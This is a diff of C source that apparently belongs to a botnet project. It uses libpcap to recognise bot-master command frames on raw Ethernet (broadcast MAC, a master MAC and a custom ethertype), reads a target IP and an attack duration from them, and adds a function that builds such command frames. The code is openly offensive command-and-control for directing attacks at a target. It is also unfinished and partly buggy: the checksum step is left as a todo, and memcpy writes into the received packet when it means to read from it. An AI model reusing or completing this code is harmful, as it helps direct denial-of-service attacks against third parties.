@@ -58,22 +58,22 @@ void print_availiable()
     pcap_freealldevs(node);
 }
 
-void extract_attack_info(const u_char *packet, u_char *target_ip, u_char *attack_time)
+void extract_attack_info(const u_char *package, u_char *target_ip, u_char *attack_time)
 {
-    memcpy(packet+14, target_ip, 4);
-    memcpy(packet+18, attack_time, 4);
+    memcpy(package+14, target_ip, 4);
+    memcpy(package+18, attack_time, 4);
 }
 
-_Bool is_bot_command(const u_char *packet)
+_Bool is_bot_command(const u_char *package)
 {
     _Bool result = true;
     for(int i=0; i<6; i++)
-        result &= packet[i] == 255;
+        result &= package[i] == broadcast_mac[i];
     
     for(int i=6; i<12; i++)
-        result &= packet[i] == bot_master_mac[i];
+        result &= package[i] == bot_master_mac[i];
     
-    return result && packet[12] == 5 && packet[13] == 233;
+    return result && package[12] == *((u_char*)(&bot_ethertype) + 1) && package[13] == *((u_char*)(&bot_ethertype) + 0);
 }
 
 void handle_packets(u_char* user, const struct pcap_pkthdr *h, const u_char *bytes)
@@ -99,4 +99,36 @@ void handle_packets(u_char* user, const struct pcap_pkthdr *h, const u_char *byt
             *((u_char*)(&sec) + i) = attack_time[i];
         printf("for %d seconds\n", attack_time);
     }
+}
+
+void create_bot_command(const u_char ip[4], int attack_time, u_char* package)
+{
+    // broadcast destination
+    for(int i=0; i<6; i++)
+        package[i] = broadcast_mac[i];
+    
+    //source address
+    for(int i=6; i<12; i++)
+    {
+        package[i] = bot_master_mac[i-6];
+    }
+
+    //ethertype
+    package[12] = *((u_char*)(&bot_ethertype) + 1);
+    package[13] = *((u_char*)(&bot_ethertype) + 0);
+    
+    //target ip
+    memcpy(package + 14, ip, 4);
+    
+    //attack time
+    for(int i=0; i<4; i++)
+        package[18+i] = *((u_char*)(&attack_time) + 3-i);
+    
+    //padding
+    for(int i=22; i<63; i++)
+        package[i] = 0;
+    
+    // FCS calculation
+    // todo
+
 }
